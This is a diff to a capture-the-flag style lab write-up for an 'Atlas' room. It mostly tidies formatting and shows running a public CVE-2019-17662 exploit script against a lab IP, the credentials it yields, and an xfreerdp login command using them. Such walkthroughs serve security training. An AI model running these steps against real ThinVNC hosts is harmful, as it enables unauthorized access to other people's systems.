@@ -196,7 +196,7 @@ PORT     STATE SERVICE       VERSION
 ```bash
 :~/Atlas# nmap -p 8080 -Pn -sV 10.201.75.19
 ...
-PORT     STATE SERVICE 
+PORT     STATE SERVICE    VERSION
 8080/tcp open  http-proxy
 ...
 ```
@@ -290,10 +290,13 @@ optional arguments:
   --accessible          Remove banners and make exploit friendly for screen readers
 ```
 
+<img width="1047" height="291" alt="image" src="https://github.com/user-attachments/assets/d1d5de11-4078-4a8f-a453-518bc42c4d74" />
+
+<br>
+<br>
 <br>
 <p>4.4. Use the credentials found by the script to get past the HTTP Basic Auth presented when trying to access the vulnerable service in your web browser. You should have access to a user desktop!br>
 <code>No answer needed</code></p>
-
 
 ```bash
 :~/Atlas/CVE-2019-17662# ./CVE-2019-17662.py 10.201.75.19 8080
@@ -314,15 +317,18 @@ optional arguments:
 <code>No answer needed</code></p>
 
 
-Username:	Atlas
-Password:	H0ldUpTheHe@vens
+<p>
+ 
+- Username:	Atlas<br>
+- Password:	H0ldUpTheHe@vens</p>
 
+<br>
 
 ```bash
-:~/Atlas/CVE-2019-17662# xfreerdp /v:10.201.75.19 /u:Atlas /p:H0ldUpTheHe@vens /cert:ignore +clipboard /dynamic-resolution /drive:share,/tm
+:~/Atlas/CVE-2019-17662# xfreerdp /v:10.201.75.19 /u:Atlas /p:H0ldUpTheHe@vens /cert:ignore +clipboard /dynamic-resolution /drive:share,/tmp
 ```
 
-<img width="824" height="623" alt="image" src="https://github.com/user-attachments/assets/d226d9de-ebe3-4ec9-9bea-a68bc6326492" />
+<img width="1233" height="648" alt="image" src="https://github.com/user-attachments/assets/25c043c5-9209-479f-bc25-e60f39213d5c" />
 
 <br>
 <br>
